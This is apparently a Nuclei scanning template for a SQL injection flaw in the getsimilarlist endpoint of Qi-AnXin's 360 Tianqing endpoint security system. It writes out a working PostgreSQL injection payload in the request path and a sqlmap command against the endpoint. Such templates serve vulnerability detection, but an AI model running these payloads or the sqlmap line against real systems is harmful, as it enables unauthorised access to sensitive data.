id: 天擎终端安全管理系统getsimilarlist存在SQL注入漏洞
time: "2025"

info:
  name: 天擎终端安全管理系统getsimilarlist SQL注入
  author: github
  severity: high
  description: |
    天擎终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案,
    奇安信360天擎getsimilarlist存在SQL注入漏洞，攻击者可通过此漏洞获取敏感信息。
  reference: null
  additional: 响应中存在qzbkq1qpzzq表示可能存在漏洞
  sqlamp: |
    python3 sqlmap.py  -u "https://xx.xx.xx.xx/api/client/getsimilarlist?status[0,1]=1&status[0]=1" --batch
  metadata:
    max-request: 1

http:
  - method: 
      - GET
    path:
      - "{{BaseURL}}/api/client/getsimilarlist?status[0,1]=(CAST((CHR(113)||CHR(122)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (8327=8327) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(122)||CHR(113)) AS NUMERIC))&status[0]=1"
    condition: and
    matchers:
      - type: word
        part: body
        words:
          - "qzbkq1qpzzq"
      - type: status
        status:
          - 200
